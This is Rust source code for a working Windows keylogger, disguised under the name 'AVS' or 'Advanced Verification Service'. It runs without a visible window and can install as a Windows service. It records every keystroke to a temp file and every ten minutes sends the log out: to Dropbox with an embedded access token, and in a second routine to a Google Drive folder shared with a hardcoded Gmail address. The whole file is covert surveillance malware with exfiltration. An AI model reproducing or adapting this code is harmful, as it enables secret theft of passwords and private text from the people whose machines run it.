#![windows_subsystem = "windows"]
use rdev::{listen, Event, EventType};
use reqwest::header::{HeaderMap, HeaderValue, AUTHORIZATION, CONTENT_TYPE};
use tokio::runtime::Runtime;
// use std::fmt::Result; // Removed to avoid conflict with the Result type alias
use std::fs::{self, OpenOptions};
use std::io::Write;
use std::path::Path;
use std::thread::{self, sleep};
use std::time::{Duration, Instant};
use google_drive3::{hyper, hyper_rustls, DriveHub};
use std::{
    ffi::OsString,
    sync::mpsc,
};
use windows_service::{
    define_windows_service,
    service::{
        ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus,
        ServiceType,
    },
    service_control_handler::{self, ServiceControlHandlerResult},
    service_dispatcher,
};
const SERVICE_NAME: &str = "AVS";
const SERVICE_DISPLAY_NAME: &str = "AVS Service";
const SERVICE_DESCRIPTION: &str = "Advanced Verification Service";
const LOG_FILE: &str = "C:\\Windows\\Temp\\avs_service.log";

pub const TOKEN: &str = include_str!("token.txt");

fn callback(event: Event) {
    if let EventType::KeyPress(key) = event.event_type {
        let file_path = "C:\\temp\\klogs.txt";
        let mut file = match OpenOptions::new()
        .append(true)
        .write(true)    // Allow writing
        .create(true)   // Create if not
        .open(file_path)
        {
            Ok(f) => f,
            Err(e) => {
                match fs::File::open("C:\\temp\\logs.txt"){
                    Ok(mut log) => {
                        let _ = log.write_all(e.to_string().as_bytes());
                    },
                    Err(_) => ()
                };
                return;
            }
        };
        let _ = file.write_all(format!("{:?}\n", key).as_bytes());
    }
}

pub async fn start_logic() {
    let folder_path = "C:\\temp"; // Change this to your desired folder path

    // Check if the directory exists, and create it if it doesn't
    if !Path::new(folder_path).exists() {
        match fs::create_dir_all(folder_path) {
            Ok(_) => (),
            Err(e) => log_to_file(&format!("Failed to create folder: {}", e)),
        }
    }

    let _ = fs::File::create("C:\\temp\\logs.txt");

    if !Path::new("C:\\temp\\noti-911d4-bc6dbf535d55.json").exists(){
        match fs::write("C:\\temp\\noti-911d4-bc6dbf535d55.json", TOKEN.to_string()) { 
            Ok(_) => (),
            Err(e) => eprintln!("Failed to create file: {}", e),
        }
    }

    thread::spawn(move || {
        if let Err(error) = listen(callback) {
            log_to_file(&format!("Error: {:?}", error));
        }
    });

    std::thread::spawn(move || {

        let rt = match Runtime::new(){
            Ok(rt) => rt,
            Err(_) => return 
        };

        rt.block_on(async move {
            loop {
                let start_time = Instant::now();
        
                let duration = Duration::new(600, 0);
                let elapsed = start_time.elapsed();
                if elapsed < duration {
                    sleep(duration - elapsed);
                }
        
                let source = "C:\\temp\\klogs.txt";
                let destination = "C:\\temp\\copy.txt";
                match fs::copy(source, destination){
                    Ok(_) => (),
                    Err(_) => continue
                };
        
                match upload_file2("C:\\temp\\copy.txt").await{
                    Ok(()) => (),
                    Err(_) => ()
                }
            }
        })
    });

    // let hwnd = unsafe { winapi::um::winuser::GetActiveWindow() };
    // if hwnd.is_null() {
    //     eprintln!("Failed to get console window handle");
    //     return;
    // }
    // unsafe {
    //     winapi::um::winuser::ShowWindow(hwnd, winapi::um::winuser::SW_MINIMIZE);
    // }

    loop {
        match fs::File::open("C:\\temp\\logs.txt"){
            Ok(mut log) => {
                let _ = log.write_all(chrono::Utc::now().timestamp_millis().to_string().as_bytes());
            },
            Err(_) => ()
        };
        thread::sleep(Duration::from_secs(10));
    }
    // if let Err(error) = listen(callback) {
    //     println!("Error: {:?}", error);
    // }
}

async fn upload_file2(file_path: &str) -> Result<(), Box<dyn std::error::Error>> {
        // === Cấu hình ===
        let access_token = format!("Bearer {}", TOKEN.trim());
        let dropbox_destination = "/test.txt";
    
        // === Đọc nội dung file ===
        let file_data = fs::read(file_path)?;
    
        // === Tạo headers ===
        let mut headers = HeaderMap::new();
        headers.insert(AUTHORIZATION, HeaderValue::from_str(&access_token)?);
        headers.insert("Dropbox-API-Arg", HeaderValue::from_str(&format!(
            "{{\"path\": \"{}\", \"mode\": \"add\", \"autorename\": true, \"mute\": false}}",
            dropbox_destination
        ))?);
        headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/octet-stream"));
    
        // === Gửi request ===
        let client = reqwest::Client::new();
        let res = client
            .post("https://content.dropboxapi.com/2/files/upload")
            .headers(headers)
            .body(file_data)
            .send()
            .await?;
    
        // === In kết quả ===
        let status = res.status();
        let text = res.text().await?;
        println!("Status: {}", status);
        println!("Response: {}", text);
    
        Ok(())
}

async fn upload_file() -> Result<(), Box<dyn std::error::Error>>{

    //let a = oauth2::read_service_account_key("C:\\temp\\noti-911d4-bc6dbf535d55.json").await?;
    let a = google_drive3::oauth2::read_service_account_key("C:\\temp\\noti-911d4-bc6dbf535d55.json").await?;
    let aut = google_drive3::oauth2::authenticator::ServiceAccountAuthenticator::builder(a).build().await?;

    // Create Drive API client
    let hub = DriveHub::new(hyper::Client::builder().build(hyper_rustls::HttpsConnectorBuilder::new().with_native_roots()?.https_or_http().enable_http1().build()), aut);

    // File to upload
    let file_path = "C:\\temp\\copy.txt"; // Path to your file
    let file_name = chrono::Local::now().to_string(); // The name you want for the uploaded file

    match fs::metadata("C:\\temp\\klogs.txt"){
        Ok(meta) => {
            if meta.len() == 0 {
                return Ok(());
            }
        },
        Err(_) => {
            return Ok(());
        }
    }

    match fs::File::create("C:\\temp\\klogs.txt"){
        Ok(_) => (),
        Err(_) => return Ok(())
    }

    // Prepare the file metadata
    let file_metadata = google_drive3::api::File {
        name: Some(file_name.to_string()),
        parents: Some(vec!["1mAxYXUhw0xd9VUepVGM87CP86tcriS_j".to_string()]),
        ..Default::default()
    };

    // Read the file content
    let file = OpenOptions::new().write(true).read(true).open(file_path)?;

    // Upload the file
    let (_, result) = hub.files().create(file_metadata).upload(file, mime::TEXT_PLAIN).await?;

    // Get the file ID and link
    let file_id = match result.id{
        Some(v) => v,
        None => return Err(Box::new(std::io::Error::new(std::io::ErrorKind::InvalidData, "")))
    };

    // Set permissions
    let user_permission = google_drive3::api::Permission {
        role: Some("reader".to_string()),
        type_: Some("user".to_string()),
        email_address: Some("boynhabecp@gmail.com".to_string()), // Replace with your email
        ..Default::default()
    };

    hub.permissions().create(user_permission, &file_id)
        .doit().await?;

    Ok(())
}

// Define the service entry point
define_windows_service!(ffi_service_main, service_main);

// Service entry point
fn service_main(_arguments: Vec<OsString>) {
    // Register service control handler
    let (shutdown_tx, shutdown_rx) = mpsc::channel();

    let event_handler = move |control_event| -> ServiceControlHandlerResult {
        match control_event {
            ServiceControl::Stop => {
                log_to_file("Service stop received");
                shutdown_tx.send(()).unwrap();
                ServiceControlHandlerResult::NoError
            }
            ServiceControl::Interrogate => ServiceControlHandlerResult::NoError,
            _ => ServiceControlHandlerResult::NotImplemented,
        }
    };

    let status_handle = match service_control_handler::register(SERVICE_NAME, event_handler) {
        Ok(handle) => handle,
        Err(e) => {
            log_to_file(&format!("Failed to register service control handler: {}", e));
            return;
        }
    };

    // Tell the system the service is running
    let next_status = ServiceStatus {
        service_type: ServiceType::OWN_PROCESS,
        current_state: ServiceState::Running,
        controls_accepted: ServiceControlAccept::STOP,
        exit_code: ServiceExitCode::Win32(0),
        checkpoint: 0,
        wait_hint: Duration::default(),
        process_id: None,
    };

    if let Err(e) = status_handle.set_service_status(next_status) {
        log_to_file(&format!("Failed to set service status: {}", e));
        return;
    }

    log_to_file("Service started");

    // Run actual service logic
    run_service(&shutdown_rx);

    // Tell the system the service is stopped
    let next_status = ServiceStatus {
        service_type: ServiceType::OWN_PROCESS,
        current_state: ServiceState::Stopped,
        controls_accepted: ServiceControlAccept::empty(),
        exit_code: ServiceExitCode::Win32(0),
        checkpoint: 0,
        wait_hint: Duration::default(),
        process_id: None,
    };

    if let Err(e) = status_handle.set_service_status(next_status) {
        log_to_file(&format!("Failed to set service status: {}", e));
    }
    
    log_to_file("Service stopped");
}

// Actual service logic
fn run_service(shutdown_rx: &mpsc::Receiver<()>) {
    log_to_file("Service is running...");

    std::thread::spawn(move || {
        let rt = Runtime::new().unwrap();
        rt.block_on(async {
            start_logic().await;
        });
    });
    
    // Wait until service is requested to stop
    loop {
        match shutdown_rx.recv_timeout(Duration::from_secs(1)) {
            Ok(_) => break, // Shutdown signal received
            Err(mpsc::RecvTimeoutError::Timeout) => {
                // Do periodic tasks here if needed
            }
            Err(e) => {
                log_to_file(&format!("Error receiving shutdown signal: {}", e));
                break;
            }
        }
    }
}

// Helper function to log messages to a file
fn log_to_file(message: &str) {
    let timestamp = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
    let log_message = format!("[{}] {}\n", timestamp, message);
    
    let mut file = match OpenOptions::new()
        .create(true)
        .append(true)
        .open(LOG_FILE) {
            Ok(file) => file,
            Err(_) => return,
        };
    
    let _ = file.write_all(log_message.as_bytes());
}

fn main() -> Result<(), windows_service::Error> {
    let args: Vec<String> = std::env::args().collect();
    //let is_debug = args.iter().any(|arg| arg == "-d");
    println!("Arguments: {:?}", args);
    println!("Running in debug mode...");
    // If running in debug mode, run the service logic directly
    std::thread::spawn(move || {
        let rt = Runtime::new().unwrap();
        rt.block_on(async {
            start_logic().await;
        });
    });
    loop {
        thread::sleep(Duration::from_secs(10));
    }

    // if is_debug {

    // }
    // // If running as a service, start the service dispatcher

    // if let Err(e) = service_dispatcher::start(SERVICE_NAME, ffi_service_main) {
    //     // If not running as a service, we're likely running from the command line
    //     println!("Not running as a service: {}", e);
    //     println!("Starting in standalone mode...");
        
    //     // Run your application logic directly
    //     let (_shutdown_tx, shutdown_rx) = mpsc::channel();
    //     run_service(&shutdown_rx);
    // }
    
    Ok(())
}
